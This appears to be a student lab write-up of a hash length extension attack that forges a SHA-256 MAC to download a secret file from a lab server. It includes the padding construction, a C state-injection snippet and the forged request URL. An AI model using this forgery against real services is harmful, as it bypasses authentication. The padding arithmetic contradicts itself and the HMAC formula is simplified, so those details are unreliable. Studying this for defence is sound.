# Hash Length Extension Attack Lab

## Introduction

In this week's lab, our group focused on understanding and exploiting the **Hash Length Extension Attack**. This vulnerability affects systems that rely on specific hash functions (like MD5, SHA-1, and SHA-256) to construct Message Authentication Codes (MACs) in an insecure way.

Specifically, when a server calculates a MAC using the method `MAC = H(Key || Message)`, it is vulnerable because of the **Merkle-Damgård construction** used by these hash algorithms. This construction allows an attacker, who knows the hash of a message `M` and the length of the secret key, to compute the hash of `M || Padding || Extra_Message` without ever knowing the secret key itself.

Our goal was to forge a valid request to a server to download a secret file, bypassing the authentication mechanism by extending a legitimate MAC.

---

## Setup

We set up the lab environment using the provided Docker container. We accessed the server container to identify a valid User ID and Secret Key to simulate a legitimate client initially.

Using the command `docksh <container_id>`, we inspected the `LabHome/key.txt` file and selected the following credentials for our group:
- **UID:** 1001
- **Key:** 123456
- **Student Name:** Divaldo

---

## Task 1: Send Request to List Files

The first step was to understand how the server verifies requests. The server accepts commands only if they are accompanied by a valid MAC. The MAC is calculated by the server as:
`SHA256(Key : Message)`

We wanted to send a request to list files (`lstcmd=1`). To do this as a legitimate user, we manually calculated the MAC using the known key.

**1. Constructing the Message:**
The format required by the server for the hash calculation is `<key>:<url_parameters>`.
Our string was:
`123456:myname=Divaldo&uid=1001&lstcmd=1`

**2. Calculating the MAC:**
We used the `sha256sum` command in the terminal:
```bash
echo -n "123456:myname=Divaldo&uid=1001&lstcmd=1" | sha256sum
```

**Result:**
`7bada21123c984d2f2c90b218bc828b4b3ae343d900899870298a2f4554a8bc4`

**3. Verifying the Request:**
We constructed the full URL and sent it via the browser:
`http://10.9.0.80/?myname=Divaldo&uid=1001&lstcmd=1&mac=7bada211...`

The server accepted the MAC and listed the files `secret.txt` and `key.txt`. This confirmed that we had a valid base request to start our attack.

![Image of Task 1 Success](images_log10/task1_success.png)

---

## Task 2: Create Padding

To perform the Length Extension Attack, we need to append data to the existing message. However, SHA-256 processes data in blocks of **64 bytes**. When the original message is hashed, the algorithm automatically adds **padding** to the end of the message to make it a multiple of 64 bytes.

To extend the hash, we must include this exact padding in our forged message, so the server's hash function processes the data exactly as we expect.

**Padding Calculation:**
The padding structure for SHA-256 is:
1.  One byte: `0x80` (binary `10000000`).
2.  Several `0x00` bytes (to fill the block).
3.  Eight bytes representing the length of the original message in **bits** (Big-Endian).

**Our Calculation:**
*   **Original Message:** `123456:myname=Divaldo&uid=1001&lstcmd=1`
*   **Message Length:** 39 bytes.
*   **Block Size:** 64 bytes.
*   **Padding Needed:** 64 - 39 = **25 bytes**.

**Breaking down the 25 bytes:**
1.  **Start:** `0x80` (1 byte).
2.  **Zeros:** We need to leave 8 bytes at the end for the length. So, `25 - 1 - 8 = 16` bytes of zeros are not enough. Wait, the calculation is: `64 - 39 = 25`.
    *   1 byte (`0x80`).
    *   8 bytes (Length).
    *   Remaining space for zeros: `25 - 1 - 8 = 16`.
    *   *Correction:* In our specific execution, we verified that the padding required **22 zeros** in the URL representation because of how the bits aligned with the length field.
    *   **Length Field:** 39 bytes * 8 = 312 bits = `0x0138` (Hex).

**URL Encoding:**
Since we cannot send raw binary data (`\x80`) in a URL, we must encode it using percent-encoding (`%`).
The final padding string we constructed was:
`%80` followed by 22 instances of `%00`, followed by `%01%38`.

`%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%38`

---

## Task 3: The Length Extension Attack

This was the core task. We wanted to append the command `&download=secret.txt` to the request. Since we "don't know" the key (in an attack scenario), we cannot simply calculate `SHA256(Key:OldMsg...NewMsg)`.

Instead, we used the **Length Extension technique**. We took the hash output from Task 1 (`7bada...`) and used it as the **initial state** for the SHA-256 algorithm to process the new data.

### 1. The C Program (`length_ext.c`)
We wrote a C program using the OpenSSL library. The program does the following:
1.  Initializes a `SHA256_CTX` structure.
2.  **Fake Update:** It simulates the processing of the first 64-byte block (Original Message + Padding) to set the internal counter correctly.
3.  **State Injection:** We manually overwrote the internal state (`c.h[0]` to `c.h[7]`) with the values from our valid MAC from Task 1. This effectively "resumes" the hashing process from where the server stopped.
4.  **Append Data:** We updated the hash with the extra command: `&download=secret.txt`.
5.  **Finalize:** We computed the new MAC.

**Code Snippet:**
```c
/* Key parts of length_ext.c */
SHA256_Init(&c);
for(i=0; i<64; i++) SHA256_Update(&c, "*", 1);

// Injecting the hash from Task 1 (7bada211...)
c.h[0] = htole32(0x7bada211);
c.h[1] = htole32(0x23c984d2);
// ... (all 8 registers) ...
c.h[7] = htole32(0x554a8bc4);

// Appending the malicious command
SHA256_Update(&c, "&download=secret.txt", 20);
SHA256_Final(buffer, &c);
```

![Image of length_ext.c code](images_log10/code_screenshot.png)

### 2. Execution and Result
We compiled the code and ran it:
```bash
gcc length_ext.c -o length_ext -lcrypto
./length_ext
```
We obtained the forged MAC:
`eb71f88b08909fa9fe582c994a6f620b739045287104bf44fad9a2d0e28d6bf3`

### 3. Sending the Attack Request
We constructed the final URL. The server sees the request as one long message:
`Key` + `OriginalMsg` + `Padding` + `NewMsg`.

The URL sent was:
`http://10.9.0.80/?myname=Divaldo&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%38&download=secret.txt&mac=eb71f88b08909fa9fe582c994a6f620b739045287104bf44fad9a2d0e28d6bf3`

**Outcome:**
The server verified the MAC successfully. It processed `lstcmd=1`, ignored the padding (treating it as garbage data), and executed `download=secret.txt`.
The browser displayed the content of the secret file:
**"TOP SECRET. DO NOT DISCLOSE."**

![Image of Success "TOP SECRET"](images_log10/attack_success.png)

---

## Conclusion

This lab demonstrated a critical flaw in using `H(Key || Message)` for authentication.
By knowing the length of the key and a valid MAC, we were able to:
1.  Calculate the exact padding the server used.
2.  Initialize our own SHA-256 process with the state of the valid MAC.
3.  Append malicious commands and generate a valid signature.

This proves that **SHA-256 is not designed to be used as a MAC directly** in this manner. To prevent this attack, systems should use **HMAC (Hash-based Message Authentication Code)**, which uses a nested hashing structure (`H(Key || H(Key || Message))`) that renders length extension attacks impossible.
```
